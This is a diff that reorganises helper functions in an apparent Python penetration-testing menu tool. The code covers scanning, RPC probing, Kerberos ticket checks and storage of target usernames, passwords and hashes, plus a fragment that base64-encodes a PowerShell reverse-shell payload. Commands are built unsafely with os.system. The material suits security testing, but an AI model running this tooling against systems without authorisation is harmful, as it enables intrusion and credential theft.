@@ -47,7 +47,7 @@ from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Load additional xParameter = bughunt and commandsonly
+# Details : Load additional administrative xParameter = bughunt or commandsonly.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
@@ -64,87 +64,17 @@ else:
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-def ssh_command(string):
-  ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(string)
-  print(ssh_stdout.read().decode())
-#   ssh.exec_command(string)
-
-def sort(string):
-   revision = ",".join(OrderedDict.fromkeys(string.split(',')))
-   return revision
-
-def cutLine(variable1, variable2):
+# CUT A LINE OUT OF FILE variable2 BASED ON STRING variable1
+def cutLine(variable1, variable2):				
    localCOM("sed -i '/" + variable1 + "/d' ./" + variable2)
    return
-   
+
+# REMOVE SPACE AND EXTRA LINES   
 def parsFile(variable):
    localCOM("sed -i '/^$/d' ./" + variable)
    return
 
-def test_DNS():
-   if DNS[:5] == "EMPTY":
-      print("[-] DNS has not been specified...")
-      return 1
-   else:
-      return 0
-
-def test_TIP():
-   if TIP[:5] == "EMPTY":
-      print("[-] REMOTE IP has not been specified...")
-      return 1
-   else:
-      return 0
-      
-def test_WEB():
-   if WEB[:5] == "EMPTY":
-      print("[-] Website url has not been specified...")
-      return 1
-   else:
-      return 0
-   
-def test_DOM():
-   if DOM[:5] == "EMPTY":
-      print("[-] DOMAIN name has not been specified...")
-      return 1
-   else:
-      return 0  
-   
-def test_USR():
-   if USR == "":
-      print("[-] USERNAME has not been specified...")
-      return 1
-   else:
-      return 0
-      
-def test_PAS():
-   if PAS == "":
-      print("[-] PASSWORD has not been specified...")
-      return 1
-   else:
-      return 0
-      
-def test_SID():
-   if SID[:5] == "EMPTY":
-      print("[-] Domain SID has not been specified...")
-      return 1
-   else:
-      return 0
-   
-def test_PRT(variable):
-   variable = "," + variable + ","
-   if variable not in PTS:
-      print("[-] Port " + variable.replace(",","") + " not found in live ports...")
-      return 1
-   else:
-      return 0
-
-def test_TSH():
-   if TSH[:5] == "EMPTY":
-      print("[-] SHARE NAME has not been specified...")
-      return 1
-   else:
-      return 0
-      
+# PERFORM A LINE COUNT ON THE FILE variable   
 def lineCount(variable):
    localCOM("cat " + variable + " | wc -l > count.tmp")
    count = (linecache.getline("count.tmp", 1).rstrip("\n"))
@@ -152,41 +82,70 @@ def lineCount(variable):
    count = count.rstrip(" ")
    count = int(count)
    return count
-   
+
+# EXTRACT NUMBERS FROM A STRING   
 def extract_numbers(input_string):
     return re.sub(r'\D', '', input_string)
 
-def spacePadding(variable,value):
-   variable = variable.rstrip("\n")
-   variable = variable[:value]
-   while len(variable) < value:
-      variable += " "
-   return variable
+# SORT A STRING    
+def sort(string):
+   revision = ",".join(OrderedDict.fromkeys(string.split(',')))
+   return revision  
 
-def dotPadding(variable,value):
-   variable = variable.rstrip("\n")
-   variable = variable[:value] 
-   while len(variable) < value:
-      variable += "."
-   return variable
+# TRIM NMAP SCANS    
+def nmapTrim(variable):
+   cutLine("# Nmap", variable)
+   cutLine("Nmap scan report", variable)
+   cutLine("Host is up, received", variable)
+   cutLine("STATE SERVICE", variable)
+   cutLine("Nmap done", variable)
+   localCOM("awk '/Service Info/' " + variable + " > service.tmp")
+   cutLine("Service Info", variable)
+   cutLine("Service detection performed", variable)   
+   return
 
-def getTime():
-   variable = str(datetime.datetime.now().time())
-   variable = variable.split(".")
-   variable = variable[0]
-   variable = variable.split(":")
-   variable = variable[0] + ":" + variable[1]
-   variable = spacePadding(variable, COL1)
-   return variable   
-   
-def getPort():
-   port = input("[?] Please enter the listening port number: ")
-   if port.isdigit():
-      return port
+# OUTPUT THE FILE CONTENTS IN GREEN   
+def catsFile(variable):
+   count = lineCount(variable)
+   if count != 0:
+      localCOM("echo '" + Green + "'")
+      localCOM("cat " + variable)
+      localCOM("echo '" + Reset + "'")
    else:
-      print("[-] Sorry, I do not understand the value " + port + "...")
-      return 1
+      pass
+   return 
 
+# OUTPUT A BANNER BASED ON variable
+def dispBanner(variable,flash):
+   ascii_banner = pyfiglet.figlet_format(variable).upper()
+   ascii_banner = ascii_banner.rstrip("\n")
+   if flash == 1:
+      localCOM("clear")
+      print(colored(ascii_banner,colour0, attrs=['bold']))
+   localCOM("pyfiglet " + variable + " > banner.tmp")
+   return
+    
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Create functional subroutines called from main.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------    
+
+# CREATE THE localCOM COMMAND    
+def localCOM(variable):
+   if xParameter == "bughunt":
+      print(colored(variable, colour5))
+      os.system(variable)
+      return
+   if xParameter == "commandsonly":
+      print(colored(variable, colour5))
+      return
+   os.system(variable)
+   return
+
+# CREATE THE remoteCOM COMMAND       
 def remoteCOM(variable):
    if proxyChains == 1:
       print("[i] Proxychains enabled...")
@@ -202,122 +161,116 @@ def remoteCOM(variable):
    os.system(variable)   
    return
    
-def localCOM(variable):
-   if xParameter == "bughunt":
-      print(colored(variable, colour5))
-      os.system(variable)
-      return
-   if xParameter == "commandsonly":
-      print(colored(variable, colour5))
-      return
-   os.system(variable)
-   return
- 
+# CREATE THE PROMPT COMMAND   
 def prompt():
    null = input("\nPress ENTER to continue...")
-   return
+   return   
+
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Create subfunctional routines called from main.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------
+
+# TEST IF DNS IS POPULATED
+def test_DNS():
+   if DNS[:5] == "EMPTY":
+      print("[-] DNS has not been specified...")
+      return 1
+   else:
+      return 0
+
+# TEST IF IP IS POPULATED
+def test_TIP():
+   if TIP[:5] == "EMPTY":
+      print("[-] REMOTE IP has not been specified...")
+      return 1
+   else:
+      return 0
+
+#TEST IF WEB IS POPULATED      
+def test_WEB():
+   if WEB[:5] == "EMPTY":
+      print("[-] Website url has not been specified...")
+      return 1
+   else:
+      return 0
+
+# TEST IF DOMAIN IS POPULATED   
+def test_DOM():
+   if DOM[:5] == "EMPTY":
+      print("[-] DOMAIN name has not been specified...")
+      return 1
+   else:
+      return 0  
    
-def wipeTokens(VALD):
-   localCOM("rm    " + dataDir + "/tokens.txt")
-   localCOM("touch " + dataDir + "/tokens.txt") 
-   for x in range(0, maxUser):
-      VALD[x] = "0"
-   return
+# TEST IF USER IS POPULATED
+def test_USR():
+   if USR == "":
+      print("[-] USERNAME has not been specified...")
+      return 1
+   else:
+      return 0
+
+# TEST IF PASSWORD IS POPULATED      
+def test_PAS():
+   if PAS == "":
+      print("[-] PASSWORD has not been specified...")
+      return 1
+   else:
+      return 0
+
+# TEST IF SID IS POPULATED      
+def test_SID():
+   if SID[:5] == "EMPTY":
+      print("[-] Domain SID has not been specified...")
+      return 1
+   else:
+      return 0
+
+# TEST IF A PORT IS PRESENT    
+def test_PRT(variable):
+   variable = "," + variable + ","
+   if variable not in PTS:
+      print("[-] Port " + variable.replace(",","") + " not found in live ports...")
+      return 1
+   else:
+      return 0
+
+# TEST IF A SHARE IS POPULATED
+def test_TSH():
+   if TSH[:5] == "EMPTY":
+      print("[-] SHARE NAME has not been specified...")
+      return 1
+   else:
+      return 0
+      
+# SPACE PAD VARIABLES
+def spacePadding(variable,value):
+   variable = variable.rstrip("\n")
+   variable = variable[:value]
+   while len(variable) < value:
+      variable += " "
+   return variable
+
+# DOT PAD VARIABLES
+def dotPadding(variable,value):
+   variable = variable.rstrip("\n")
+   variable = variable[:value] 
+   while len(variable) < value:
+      variable += "."
+   return variable
    
-def nmapTrim(variable):
-   cutLine("# Nmap", variable)
-   cutLine("Nmap scan report", variable)
-   cutLine("Host is up, received", variable)
-   cutLine("STATE SERVICE", variable)
-   cutLine("Nmap done", variable)
-   localCOM("awk '/Service Info/' " + variable + " > service.tmp")
-   cutLine("Service Info", variable)
-   cutLine("Service detection performed", variable)   
-   return
-   
-def saveParams():
-   localCOM("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp"); localCOM("echo '\n' >> base64.tmp") 
-   localCOM("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + POR + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + WEB + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + WAF + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + HST + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + CSP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + XOP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + CON + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + USR + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + PAS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + NTM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + TGT + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + DOM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + SDM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + FIL + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + UN1 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + UN2 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + UN3 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + UN4 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-     
-   parsFile("base64.tmp")
-   
-   OSF2 = linecache.getline("base64.tmp", 1).rstrip("\n")  
-   COM2 = linecache.getline("base64.tmp", 2).rstrip("\n")
-   DNS2 = linecache.getline("base64.tmp", 3).rstrip("\n")
-   TIP2 = linecache.getline("base64.tmp", 4).rstrip("\n")
-   POR2 = linecache.getline("base64.tmp", 5).rstrip("\n")
-   PTS2 = linecache.getline("base64.tmp", 6).rstrip("\n")
-   WEB2 = linecache.getline("base64.tmp", 7).rstrip("\n")
-   WAF2 = linecache.getline("base64.tmp", 8).rstrip("\n")
-   HST2 = linecache.getline("base64.tmp", 9).rstrip("\n")
-   CSP2 = linecache.getline("base64.tmp", 10).rstrip("\n")
-   XOP2 = linecache.getline("base64.tmp", 11).rstrip("\n")
-   CON2 = linecache.getline("base64.tmp", 12).rstrip("\n")   
-   USR2 = linecache.getline("base64.tmp", 13).rstrip("\n")
-   PAS2 = linecache.getline("base64.tmp", 14).rstrip("\n")
-   NTM2 = linecache.getline("base64.tmp", 15).rstrip("\n")
-   TGT2 = linecache.getline("base64.tmp", 16).rstrip("\n")
-   DOM2 = linecache.getline("base64.tmp", 17).rstrip("\n")
-   SID2 = linecache.getline("base64.tmp", 18).rstrip("\n")
-   SDM2 = linecache.getline("base64.tmp", 19).rstrip("\n")      
-   FIL2 = linecache.getline("base64.tmp", 20).rstrip("\n")
-   TSH2 = linecache.getline("base64.tmp", 21).rstrip("\n")
-   UN12 = linecache.getline("base64.tmp", 22).rstrip("\n")  
-   UN22 = linecache.getline("base64.tmp", 23).rstrip("\n")
-   UN32 = linecache.getline("base64.tmp", 24).rstrip("\n")
-   UN42 = linecache.getline("base64.tmp", 25).rstrip("\n")       
-   
-   cursor.execute("UPDATE REMOTETARGET SET OSF = \"" + OSF2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET DNS = \"" + DNS2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET TIP = \"" + TIP2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET POR = \"" + POR2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET PTS = \"" + PTS2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET WEB = \"" + WEB2 + "\" WHERE IDS = 1"); connection.commit() 
-   cursor.execute("UPDATE REMOTETARGET SET WAF = \"" + WAF2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET HST = \"" + HST2 + "\" WHERE IDS = 1"); connection.commit()    
-   cursor.execute("UPDATE REMOTETARGET SET CSP = \"" + CSP2 + "\" WHERE IDS = 1"); connection.commit()    
-   cursor.execute("UPDATE REMOTETARGET SET XOP = \"" + XOP2 + "\" WHERE IDS = 1"); connection.commit()    
-   cursor.execute("UPDATE REMOTETARGET SET CON = \"" + CON2 + "\" WHERE IDS = 1"); connection.commit()          
-   cursor.execute("UPDATE REMOTETARGET SET USR = \"" + USR2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET PAS = \"" + PAS2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET NTM = \"" + NTM2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET TGT = \"" + TGT2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET DOM = \"" + DOM2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET SID = \"" + SID2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET SDM = \"" + SDM2 + "\" WHERE IDS = 1"); connection.commit()          
-   cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET TSH = \"" + TSH2 + "\" WHERE IDS = 1"); connection.commit() 
-   cursor.execute("UPDATE REMOTETARGET SET UN1 = \"" + UN12 + "\" WHERE IDS = 1"); connection.commit()    
-   cursor.execute("UPDATE REMOTETARGET SET UN2 = \"" + UN22 + "\" WHERE IDS = 1"); connection.commit()    
-   cursor.execute("UPDATE REMOTETARGET SET UN3 = \"" + UN32 + "\" WHERE IDS = 1"); connection.commit()    
-   cursor.execute("UPDATE REMOTETARGET SET UN4 = \"" + UN42 + "\" WHERE IDS = 1"); connection.commit()          
-    
-   return
-     
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Create subfunctional routines called from main.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------
+
 def privCheck():
    localCOM("ls  | grep ccache > ticket.tmp")   
    count = lineCount("ticket.tmp")   
@@ -340,13 +293,21 @@ def privCheck():
          print("[-] Unable to find a valid ticket...")
    return spacePadding(ticket, COL1)
       
-def iker(TIP):
-   TTIP = TIP.rstrip(" ")
-   localCOM("echo 'IKE SCAN PORT 500' > ike.tmp")
-   remoteCOM("ike-scan -M " + TTIP + " >> ike.tmp")
-   catsFile("ike.tmp")
+def getPort():
+   port = input("[?] Please enter the listening port number: ")
+   if port.isdigit():
+      return port
+   else:
+      print("[-] Sorry, I do not understand the value " + port + "...")
+      return 1
+ 
+def wipeTokens(VALD):
+   localCOM("rm    " + dataDir + "/tokens.txt")
+   localCOM("touch " + dataDir + "/tokens.txt") 
+   for x in range(0, maxUser):
+      VALD[x] = "0"
    return
-
+      
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
@@ -355,6 +316,53 @@ def iker(TIP):
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
          
+def checkInterface(variable, COM):
+   print(colored("[*] Checking network interface...", colour3))  
+   try:      
+      authLevel = RPC_C_AUTHN_LEVEL_NONE      
+      if variable == "DNS":
+         stringBinding = r'ncacn_ip_tcp:%s' % DNS.rstrip(" ")
+      if variable == "TIP":
+         stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")                  
+      rpctransport = transport.DCERPCTransportFactory(stringBinding)
+      portmap = rpctransport.get_dce_rpc()
+      portmap.set_auth_level(authLevel)
+      portmap.connect()
+      objExporter = IObjectExporter(portmap)
+      bindings = objExporter.ServerAlive2()      
+      checkParam = 0            
+      for binding in bindings:
+         NetworkAddr = binding['aNetworkAddr']                  
+         if checkParam == 0:
+            if "." not in NetworkAddr:
+               print("[+] Found network interface...\n")
+               COM = NetworkAddr
+               COM = COM.replace(chr(0), '')
+               checkParam = 1               
+         print(colored("Address: " + NetworkAddr, colour6))  
+      print("")                
+   except:
+      print("[-] No responce from network interface, checking remote host instead...")
+      COM = spacePadding("UNKNOWN", COL0)      
+      if variable == "DNS":
+         remoteCOM("ping -c 5 " + DNS.rstrip(" ") + " > ping.tmp")
+      if variable == "TIP":
+         remoteCOM("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")           
+      cutLine("PING","ping.tmp")         # First line
+      cutLine("statistics","ping.tmp")   # Third from bottom
+      parsFile("ping.tmp")		
+      localCOM("sed -i '$d' ./ping.tmp") # Last line
+      count = lineCount("ping.tmp")
+      nullTest = linecache.getline("ping.tmp", count).rstrip("\n")
+      localCOM("sed -i '$d' ./ping.tmp")
+      catsFile("ping.tmp") 
+      if nullTest != "":
+         print ("[+] " + nullTest + "...")
+      else:
+         print("[-] No responce from host...")
+   COM = spacePadding(COM, COL0)
+   return COM       
+
 def getTCPorts():
    checkParam = test_TIP()
    if checkParam == 1:
@@ -456,64 +464,21 @@ def squidCheck():
          print("[-] Unable to enumerate hidden ports, proxychains enabled...")
    return
    
-   
-def grp():
-   print(colored("[*] Checkimg grp list...", colour3))
-   checkParam = test_PRT("50051")   
-   if checkParam == 1:
-      return
-   else:
-      print("[+] Found the following services...")      
-      remoteCOM("/root/go/bin/grpcurl -plaintext " + TIP.rstrip(" ") + ":50051 list >> grp.tmp")
-      catsFile("grp.tmp")
+def iker(TIP):
+   TTIP = TIP.rstrip(" ")
+   localCOM("echo 'IKE SCAN PORT 500' > ike.tmp")
+   remoteCOM("ike-scan -M " + TTIP + " >> ike.tmp")
+   catsFile("ike.tmp")
    return
    
-def checkInterface(variable, COM):
-   print(colored("[*] Checking network interface...", colour3))  
-   try:      
-      authLevel = RPC_C_AUTHN_LEVEL_NONE      
-      if variable == "DNS":
-         stringBinding = r'ncacn_ip_tcp:%s' % DNS.rstrip(" ")
-      if variable == "TIP":
-         stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")                  
-      rpctransport = transport.DCERPCTransportFactory(stringBinding)
-      portmap = rpctransport.get_dce_rpc()
-      portmap.set_auth_level(authLevel)
-      portmap.connect()
-      objExporter = IObjectExporter(portmap)
-      bindings = objExporter.ServerAlive2()      
-      checkParam = 0            
-      for binding in bindings:
-         NetworkAddr = binding['aNetworkAddr']                  
-         if checkParam == 0:
-            if "." not in NetworkAddr:
-               print("[+] Found network interface...\n")
-               COM = NetworkAddr
-               COM = COM.replace(chr(0), '')
-               checkParam = 1               
-         print(colored("Address: " + NetworkAddr, colour6))  
-      print("")                
-   except:
-      print("[-] No responce from network interface, checking remote host instead...")
-      COM = spacePadding("UNKNOWN", COL0)      
-      if variable == "DNS":
-         remoteCOM("ping -c 5 " + DNS.rstrip(" ") + " > ping.tmp")
-      if variable == "TIP":
-         remoteCOM("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")           
-      cutLine("PING","ping.tmp")         # First line
-      cutLine("statistics","ping.tmp")   # Third from bottom
-      parsFile("ping.tmp")		
-      localCOM("sed -i '$d' ./ping.tmp") # Last line
-      count = lineCount("ping.tmp")
-      nullTest = linecache.getline("ping.tmp", count).rstrip("\n")
-      localCOM("sed -i '$d' ./ping.tmp")
-      catsFile("ping.tmp") 
-      if nullTest != "":
-         print ("[+] " + nullTest + "...")
-      else:
-         print("[-] No responce from host...")
-   COM = spacePadding(COM, COL0)
-   return COM       
+def getTime():
+   variable = str(datetime.datetime.now().time())
+   variable = variable.split(".")
+   variable = variable[0]
+   variable = variable.split(":")
+   variable = variable[0] + ":" + variable[1]
+   variable = spacePadding(variable, COL1)
+   return variable   
    
 def checkBIOS():
    if IP46 == "-6":
@@ -574,16 +539,6 @@ def networkSweep():
    localCOM("echo '" + Reset + "'")
    return      
    
-def catsFile(variable):
-   count = lineCount(variable)
-   if count != 0:
-      localCOM("echo '" + Green + "'")
-      localCOM("cat " + variable)
-      localCOM("echo '" + Reset + "'")
-   else:
-      pass
-   return   
-   
 def timeSync(SKEW):
    print(colored("[*] Attempting to synchronise time with remote server...", colour3))
    checkParam = test_PRT("88")   
@@ -604,7 +559,31 @@ def timeSync(SKEW):
          SKEW = 1
       else:
          print("[-] Server synchronisation did not occur...")
-   return SKEW                     
+   return SKEW    
+   
+def grp():
+   print(colored("[*] Checkimg grp list...", colour3))
+   checkParam = test_PRT("50051")   
+   if checkParam == 1:
+      return
+   else:
+      print("[+] Found the following services...")      
+      remoteCOM("/root/go/bin/grpcurl -plaintext " + TIP.rstrip(" ") + ":50051 list >> grp.tmp")
+      catsFile("grp.tmp")
+   return  
+  
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : GetPorts - obtain all open ports on identified host.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------                      
+
+# SSH INTO REMOTE SYSTEM      
+def ssh_command(string):
+  ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(string)
+  print(ssh_stdout.read().decode())  
 
 def registryKeys():
    print("\tHKEY_CLASSES_ROOT   HKCR")
@@ -667,15 +646,14 @@ def powershell(ip, port):
    payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
    return payload
       
-def dispBanner(variable,flash):
-   ascii_banner = pyfiglet.figlet_format(variable).upper()
-   ascii_banner = ascii_banner.rstrip("\n")
-   if flash == 1:
-      localCOM("clear")
-      print(colored(ascii_banner,colour0, attrs=['bold']))
-   localCOM("pyfiglet " + variable + " > banner.tmp")
-   return
-   
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : GetPorts - obtain all open ports on identified host.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------   
+  
 def dispSubMenu(variable):
    variable = spacePadding(variable,163)
    localCOM("clear")
@@ -711,46 +689,36 @@ def dispMenu():
    else:
       print(colored(COM.upper(),colour6), end=' ')      
    print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAMES",colour5) + (" ")*15 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551' + " PORT  " + '\u2551' + " TCP SERVICE" + (" ")*22 + '\u2551' + " PORT  " + '\u2551' + " UDP SERVICE" + (" ")*22 + '\u2551' + " LOCAL IP ", end=' ')
-   
 # ADD IN THE NUMER OF USERNAMES IN THE LIST ON THE BANNER HERE   
-   
    print(colored(localIP2,colour6), end=' ') 
    print((" ")*36 + '\u2551') 
    print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' +  ('\u2550')*63 + '\u2563')   
-  
-
    for loop in range(0,screenLength - 2):
       print('\u2551' + " " + coloum_one_Labels[loop] + "  " +  '\u2551', end=' ')
       if (loop == 0) & (OSF[:5] == "EMPTY"):
          print(colored(OSF[:COL1],colour7), end=' ') 
       else: 
          if(loop == 0): print(colored(OSF[:COL1],colour6), end=' ')
-         
       if (loop == 1) & (DNS[:5] == "EMPTY"):
          print(colored(DNS[:COL1],colour7), end=' ')
       else:
          if(loop == 1): print(colored(DNS[:COL1],colour6), end=' ')
-         
       if (loop == 2) & (TIP[:5] == "EMPTY"):
          print(colored(TIP[:COL1],colour7), end=' ')
       else:
          if(loop == 2): print(colored(TIP[:COL1],colour6), end=' ')
-         
       if (loop == 3) & (POR[:5] == "EMPTY"):
          print(colored(POR[:COL1],colour7), end=' ')
       else:
          if(loop == 3): print(colored(POR[:COL1],colour6), end=' ')
-         
       if (loop == 4) & (WEB[:5] == "EMPTY"):
          print(colored(WEB[:COL1],colour7), end=' ')
       else: 
          if(loop == 4): print(colored(WEB[:COL1],colour6), end=' ')
-         
       if loop == 5 and WAF[:7] == "UNKNOWN":
          print (colored(WAF[:COL1],colour7), end=' ')
       else:
          if(loop == 5): print (colored(WAF[:COL1],colour6), end=' ')                 
-                  
       if loop == 6:
          if (HST[:7] == "FOUND  "): print (colored(HST,colour6[:COL1]), end=' ')
          if (HST[:7] == "UNKNOWN"): print (colored(HST,colour7[:COL1]), end=' ')  
@@ -801,7 +769,6 @@ def dispMenu():
       if loop == 20 and UN2[:5] == "EMPTY": print (colored(UN2,colour1), end=' ')      
       if loop == 21 and UN3[:5] == "EMPTY": print (colored(UN3,colour1), end=' ')
       if loop == 22 and UN4[:5] == "EMPTY": print (colored(UN4,colour1), end=' ')
-
       if loop == 23 and communityString[:5] == "EMPTY": 
         print (colored(communityString,colour7), end=' ')
       else:
@@ -817,7 +784,6 @@ def dispMenu():
       else:
          if loop == 25:
             print (colored(currentWordlist[-COL1:][:COL1],colour6), end=' ')
-
       print('\u2551', end=' ')       
       if TSH.rstrip(" ") in SHAR[loop]:
          print(colored(SHAR[loop],colour3), end=' ')        
@@ -841,7 +807,6 @@ def dispMenu():
       print('\u2551', end=' ')   
       print(colored(servsUDP[loop], colour6), end=' ')              
       print('\u2551' + " "*63 + '\u2551')
-
    print('\u2560' + ('\u2550')*14 + '\u2569' + ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' +  ('\u2550')*63 + '\u2563' )
    return
    
@@ -862,6 +827,93 @@ def options():
       print(menuName.rstrip(" "), end= ' ' + "     " + '\u2551')
    print("")
    print('\u255A' + '\u2550'*313 + '\u255D')
+   return
+   
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Create subfunctional routines called from main.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------
+   
+def saveParams():
+   localCOM("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp"); localCOM("echo '\n' >> base64.tmp") 
+   localCOM("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + POR + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + WEB + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + WAF + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + HST + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + CSP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + XOP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + CON + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
